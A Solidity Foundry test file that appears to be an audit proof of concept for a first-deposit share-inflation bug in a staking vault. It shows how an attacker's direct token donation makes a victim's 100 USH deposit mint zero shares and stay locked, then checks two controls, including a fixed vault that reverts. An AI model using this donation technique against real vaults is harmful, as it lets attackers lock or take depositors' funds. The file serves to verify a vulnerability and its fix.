// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    StakedUSH,
    StakedUSHFixed,
    MiniToken,
    Math
} from "./62715-c-01-first-deposit-can-result-in-zero-shares-due-to-direct-t.sol";

contract FirstDepositZeroSharesTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant VICTIM = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant DONATION = 100 ether;
    uint256 internal constant DEPOSIT = 100 ether;

    /// @notice The bug: a direct USH transfer into the empty vault floors the
    ///         first depositor's shares to 0, locking their 100 USH.
    function test_exploit_firstDepositZeroShares_locksFunds() public {
        Exploit e = new Exploit();
        e.run();

        // Victim deposited a positive amount and received exactly 0 shares.
        assertEq(e.victimShares(), 0, "victim received zero shares");
        assertEq(e.victimDeposited(), DEPOSIT, "victim deposited 100 USH");

        // The 100 USH is genuinely stuck in the vault: donation + deposit held,
        // but the victim owns 0 shares against it -> unredeemable / locked.
        StakedUSH vault = StakedUSH(e.vaultAddr());
        MiniToken ush = MiniToken(e.ushAddr());
        assertEq(ush.balanceOf(e.vaultAddr()), DONATION + DEPOSIT, "vault holds 200 USH");
        assertEq(vault.balanceOf(VICTIM), 0, "victim owns no shares in the vault");
        assertEq(vault.totalSupply(), 0, "no shares minted at all");
        assertEq(e.lockedUsh(), DEPOSIT, "100 USH locked");

        // Marker records the locked magnitude at the SINK.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), DEPOSIT, "marker records 100 LOCKED-USH at SINK");
    }

    /// @notice Negative control A (reduction-plan control): the SAME vulnerable
    ///         vault WITHOUT the prior direct transfer mints correct nonzero
    ///         shares. Proves the donation is the trigger, not a broken formula.
    function test_control_noDonation_firstDepositMintsNonzero() public {
        MiniToken ush = new MiniToken("USH", "USH");
        StakedUSH vault = new StakedUSH(address(ush));

        ush.mint(address(this), DEPOSIT);
        ush.approve(address(vault), DEPOSIT);
        uint256 shares = vault.deposit(DEPOSIT, VICTIM);

        // No donation: shares = 100e18 * (0 + 1) / (0 + 1) = 100e18. Nonzero.
        assertEq(shares, DEPOSIT, "first deposit mints 1:1 when un-donated");
        assertEq(vault.balanceOf(VICTIM), DEPOSIT, "victim owns nonzero shares");
        assertGt(shares, 0, "shares are nonzero without the donation");
    }

    /// @notice Negative control B (apply the fix): the fixed vault, under the
    ///         IDENTICAL donation scenario, reverts the zero-share deposit so
    ///         the victim's funds are never pulled in -> no lock.
    function test_control_fixedVault_donationDepositReverts() public {
        MiniToken ush = new MiniToken("USH", "USH");
        StakedUSHFixed vault = new StakedUSHFixed(address(ush));

        // attacker donation poisons the empty vault
        ush.mint(address(this), DONATION);
        ush.transfer(address(vault), DONATION);

        // victim's first deposit would price to 0 shares -> fix rejects it
        ush.mint(VICTIM, DEPOSIT);
        vm.startPrank(VICTIM);
        ush.approve(address(vault), DEPOSIT);
        vm.expectRevert(StakedUSHFixed.ZeroShares.selector);
        vault.deposit(DEPOSIT, VICTIM);
        vm.stopPrank();

        // Victim keeps their funds; nothing locked in the fixed vault.
        assertEq(ush.balanceOf(VICTIM), DEPOSIT, "victim retains funds under the fix");
        assertEq(ush.balanceOf(address(vault)), DONATION, "only the attacker's donation sits in the vault");
    }
}
